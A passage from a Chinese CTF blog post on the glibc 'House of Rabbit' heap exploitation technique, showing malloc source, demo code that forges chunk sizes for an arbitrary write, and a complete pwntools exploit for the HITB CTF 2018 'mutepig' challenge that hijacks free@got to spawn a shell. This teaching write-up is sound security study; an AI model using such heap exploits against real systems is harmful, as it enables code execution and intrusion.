+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">             || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">           malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                            chunk2mem (victim), av);</span><br><span class="line">         size = chunksize (victim);</span><br></pre></td></tr></table></figure>
+<p>步骤代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 5. Link unsorted bins to appropriate list</span><br><span class="line">	printf(	&quot;5. Link unsorted bins to appropriate list\n&quot;</span><br><span class="line">		&quot;  Rewrite fake_chunk1&apos;s size to 0xa00001 to bypass &apos;size &lt; av-&gt;system_mem&apos; check.\n&quot;);</span><br><span class="line">	gbuf[3] = 0xa00001;</span><br><span class="line">	malloc(0xa00000);</span><br><span class="line">	printf(	&quot;  Allocate huge chunk.\n&quot;</span><br><span class="line">		&quot;  Now, fake_chunk1 link to largebin[126](max).\n&quot;</span><br><span class="line">		&quot;  Then, write fake_chunk1&apos;s size back to 0xfffffffffffffff1.\n\n&quot;);</span><br><span class="line">	gbuf[3] = 0xfffffffffffffff1;</span><br></pre></td></tr></table></figure>
+<p>最终，程序的堆块布局如下：</p>
+<p><img src="/img/house_of_rabbit/5.png" alt=""></p>
+<h2 id="步骤6-任意内存分配"><a href="#步骤6-任意内存分配" class="headerlink" title="步骤6 任意内存分配"></a>步骤6 任意内存分配</h2><p>当伪造堆块进入large bin最后一个队列时，将伪造堆块的大小改回0xfffffffffffffff1，此时在申请任意长度的地址，使堆块地址上溢到当前堆地址的低地址位置，从而可以分配到任意地址，达到内存任意写的目的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 6. Overwrite targer variable</span><br><span class="line">printf(	&quot;6. Overwrite targer variable on .data\n&quot;</span><br><span class="line">	&quot;  target is at %p\n&quot;</span><br><span class="line">	&quot;  Before : %s\n&quot;</span><br><span class="line">	, &amp;target, target);</span><br><span class="line"></span><br><span class="line">malloc((void*)&amp;target-(void*)(gbuf+2)-0x20);</span><br><span class="line">victim = malloc(0x10);</span><br><span class="line">printf(&quot;  Allocate 0x10 byte at %p, and overwrite.\n&quot;, victim);</span><br><span class="line">strcpy(victim, &quot;Hacked!!&quot;);</span><br><span class="line"></span><br><span class="line">printf(&quot;  After  : %s\n&quot;, target);</span><br></pre></td></tr></table></figure>
+<h1 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h1><h2 id="HITB-CTF-2018-mutepig"><a href="#HITB-CTF-2018-mutepig" class="headerlink" title="HITB CTF 2018       mutepig"></a>HITB CTF 2018       mutepig</h2><p>题目提供分配大小为0x10、0x80、0xa00000、0xffffffffffffff70大小的堆块，并且没有开启PIE保护，还存在UAF漏洞，完全满足该利用方法需求，通过将内存地址分配回bss段低地址部分的堆地址指针数组，覆写数组内容为free@got，利用编辑功能，将其内容改为system@plt，在free时可以拿到shell。</p>
+<p>坑点在于此题没有输出，调试比较坑。另外需要注意<strong>利用方法</strong>中提到的当大堆块释放到unsorted bin时，小堆块的值会有改动。</p>
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf=ELF(<span class="string">'mutepig'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./mutepig'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'47.75.128.158'</span>, <span class="number">9999</span>)</span><br><span class="line">	<span class="comment">#libc = ELF('./libc.so.6')</span></span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	<span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line">	<span class="comment">#off = 0x001b0000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(type,content)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.sendline(str(type))</span><br><span class="line">	p.send(content)</span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content1,content2)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.send(content1)</span><br><span class="line">	p.send(content2)</span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bss_list = <span class="number">0x06020C0</span></span><br><span class="line">bss_can_be_edit = <span class="number">0x602120</span></span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_0'</span>) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_1'</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'p4nda_2'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'p4nda_3'</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(bss_can_be_edit+<span class="number">0x10</span>)[:<span class="number">-1</span>],p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffff1</span>)+<span class="string">'\0'</span>*<span class="number">15</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)[:<span class="number">-1</span>],p64(<span class="number">0</span>)+p64(<span class="number">0x11</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xA00001</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'p4nda_4'</span>) <span class="comment">#4</span></span><br><span class="line">edit(<span class="number">2</span>,p64(bss_can_be_edit+<span class="number">0x10</span>)[:<span class="number">-1</span>],p64(<span class="number">0xfffffffffffffff0</span>)+p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xfffffffffffffff1</span>))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">add(<span class="number">0x3419</span>,<span class="string">'p4nda_5'</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">1</span>,p64(elf.got[<span class="string">'free'</span>])[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(elf.symbols[<span class="string">'system'</span>])[:<span class="number">-1</span>],<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">'/bin/sh'</span>,<span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><a href="/img/house_of_rabbit/mutepig">题目</a></p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2018/04/17/hitb2018/" title= HITB CTF 2018 部分PWN题解 >
+                    <span>Previous Post</span>
+                    <span>HITB CTF 2018 部分PWN题解</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zMzUzOS8xMDA5NQ==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:p4nda_dubhe@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="/github.com/ret2p4nda" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <a href="https://www.zhihu.com/people/panda_Z/activities" class="iconfont-archer zhihu" target="_blank" title="zhihu"></a>
+            
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">VISITOR VOLUME: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#所需条件"><span class="toc-number">1.</span> <span class="toc-text">所需条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方法"><span class="toc-number">2.</span> <span class="toc-text">利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用样例"><span class="toc-number">2.1.</span> <span class="toc-text">使用样例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#步骤1-增大malloc函数中-mmap分配阈值"><span class="toc-number">2.2.</span> <span class="toc-text">步骤1 增大malloc函数中 mmap分配阈值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#步骤2-申请小堆块并放入fastbin"><span class="toc-number">2.3.</span> <span class="toc-text">步骤2  申请小堆块并放入fastbin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#步骤3-伪造堆块并劫持至fastbin"><span class="toc-number">2.4.</span> <span class="toc-text">步骤3 伪造堆块并劫持至fastbin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin"><span class="toc-number">2.5.</span> <span class="toc-text">步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#步骤5-分配内存-使伪造堆块进入large-bin"><span class="toc-number">2.6.</span> <span class="toc-text">步骤5 分配内存 使伪造堆块进入large bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#步骤6-任意内存分配"><span class="toc-number">2.7.</span> <span class="toc-text">步骤6 任意内存分配</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#相关题目"><span class="toc-number">3.</span> <span class="toc-text">相关题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HITB-CTF-2018-mutepig"><span class="toc-number">3.1.</span> <span class="toc-text">HITB CTF 2018       mutepig</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 11 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href= "/2018/04/18/house-of-rabbit/" >House Of Rabbit 原理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2018/04/17/hitb2018/" >HITB CTF 2018 部分PWN题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/kernel-pwn-start/" >CTF KETNEL PWN 入门记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/0ctf2018/" >0ctf 2018 PWN 部分题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href= "/2018/03/27/QWB2018/" >QWBCTF 2018 PWN 部分题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2018/03/20/tcache/" >tcache 源码分析及利用思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/n1ctf2018/" >N1CTF 2018 && 线程堆知识源代码分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2018/03/06/hgame/" >HGAME 2018 PWN题记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span><a class="archive-post-title" href= "/2018/03/03/question/" >问题解决及工具使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2018/02/05/hitctf/" >HITCTF 2018 PWN 题记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span><a class="archive-post-title" href= "/2018/01/23/hello-world/" >Hello World</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">CTF</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">PWN</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">hello</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">world</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">Questions</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">Linux</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">KERNEL</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: false
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ统计  -->
+    
+    </div>
+    </body>
+</html>
+
+
